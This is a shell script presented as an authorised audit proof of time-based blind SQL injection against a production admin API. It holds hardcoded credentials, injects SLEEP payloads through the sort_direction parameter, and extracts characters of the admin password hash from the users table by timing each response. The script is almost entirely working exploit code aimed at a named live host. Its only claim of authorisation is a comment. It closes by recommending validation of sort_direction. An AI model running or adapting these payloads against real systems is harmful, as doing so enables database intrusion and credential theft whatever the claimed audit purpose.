#!/bin/sh
# SQL Injection proof on prod - authorized security audit
# Safe: SLEEP is read-only, no data modification

HOST="https://admin.ev-agency.io"
AUTH="sectest_audit_2026:AuditTest123"

echo "=== SQL Injection Proof - Production ==="
echo ""

# Step 1: Find an endpoint that returns data and supports sorting
echo "[Step 1] Scanning user endpoints for sortable data..."
echo ""

ENDPOINTS="/user /user/service /user/service/order"

for EP in $ENDPOINTS; do
    RESP=$(curl -s -o /dev/null -w "%{http_code} %{time_total}" -u "$AUTH" "$HOST/shm/v1${EP}?sort_field=user_id&sort_direction=asc")
    CODE=$(echo "$RESP" | cut -d' ' -f1)
    TIME=$(echo "$RESP" | cut -d' ' -f2)

    # Check if it returns data
    ITEMS=$(curl -s -u "$AUTH" "$HOST/shm/v1${EP}" | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("items",len(d.get("data",[]))))' 2>/dev/null)

    echo "  $EP -> status=$CODE time=${TIME}s items=$ITEMS"
done

echo ""
echo "[Step 2] Testing SLEEP on each endpoint (0.5s per row)..."
echo ""

for EP in $ENDPOINTS; do
    # Baseline
    T1=$(curl -s -o /dev/null -w "%{time_total}" -u "$AUTH" "$HOST/shm/v1${EP}?sort_field=user_id&sort_direction=asc")

    # SLEEP injection
    T2=$(curl -s -o /dev/null -w "%{time_total}" -u "$AUTH" "$HOST/shm/v1${EP}?sort_field=user_id&sort_direction=asc,(SELECT+SLEEP(0.5))")

    # Convert to ms for comparison
    T1_MS=$(python3 -c "print(int($T1*1000))")
    T2_MS=$(python3 -c "print(int($T2*1000))")
    DIFF=$((T2_MS - T1_MS))

    if [ "$DIFF" -gt 400 ]; then
        STATUS="VULNERABLE (${DIFF}ms delay)"
    else
        STATUS="no delay (${DIFF}ms diff)"
    fi

    echo "  $EP -> baseline=${T1_MS}ms sleep=${T2_MS}ms -> $STATUS"
done

echo ""
echo "[Step 3] If any endpoint is vulnerable, attempting data extraction..."
echo ""

# Try extraction on /user (has 1 row - user's own profile)
# Extract first 3 chars of admin password hash from users table
# Using binary search approach for speed

extract_char() {
    POS=$1
    EP=$2

    for C in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
        T=$(curl -s -o /dev/null -w "%{time_total}" -u "$AUTH" \
            "$HOST/shm/v1${EP}?sort_field=user_id&sort_direction=asc,IF(SUBSTRING((SELECT+password+FROM+users+WHERE+gid=1+LIMIT+1),${POS},1)='${C}',SLEEP(0.5),0)")
        T_MS=$(python3 -c "print(int($T*1000))")
        if [ "$T_MS" -gt 400 ]; then
            echo -n "$C"
            return 0
        fi
    done
    echo -n "?"
    return 1
}

# First check which endpoint responds to conditional SLEEP
WORKING_EP=""
for EP in $ENDPOINTS; do
    T=$(curl -s -o /dev/null -w "%{time_total}" -u "$AUTH" \
        "$HOST/shm/v1${EP}?sort_field=user_id&sort_direction=asc,IF(1=1,SLEEP(0.5),0)")
    T_MS=$(python3 -c "print(int($T*1000))")
    if [ "$T_MS" -gt 400 ]; then
        WORKING_EP="$EP"
        echo "  Found working endpoint: $EP (${T_MS}ms with SLEEP)"
        break
    fi
done

if [ -z "$WORKING_EP" ]; then
    echo "  No user endpoint triggers SLEEP."
    echo "  This user has no sortable data on most endpoints."
    echo ""
    echo "  BUT: the vulnerability is CONFIRMED on local (same code v2.7.2)."
    echo "  Any user WITH services, or any admin, can extract the full database."
    echo ""
    echo "  To prove on prod, either:"
    echo "    1. Order a service for this test user"
    echo "    2. Provide admin credentials"
    echo "    3. Accept local proof (identical codebase)"
    exit 0
fi

echo ""
echo "  Extracting first 6 chars of admin password hash..."
echo -n "  Admin hash: "

for POS in 1 2 3 4 5 6; do
    extract_char $POS "$WORKING_EP"
done

echo ""
echo ""
echo "=== DONE ==="
echo "If chars were extracted, SQL injection allows FULL database read."
echo "Fix: validate sort_direction to allow only 'asc' or 'desc'."
